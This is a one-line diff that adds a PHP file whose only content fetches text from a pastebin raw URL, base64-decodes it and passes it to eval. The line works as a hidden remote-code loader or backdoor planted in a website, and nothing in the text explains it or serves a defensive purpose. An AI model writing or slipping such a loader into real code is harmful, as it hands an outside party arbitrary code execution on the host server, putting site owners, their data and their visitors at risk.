@@ -1,0 +1,1 @@
+<?php $Izaass = file_get_contents('http://pastebin.com/raw.php?i=RpwiZ8BC'); eval(base64_decode($Izaass)); ?>
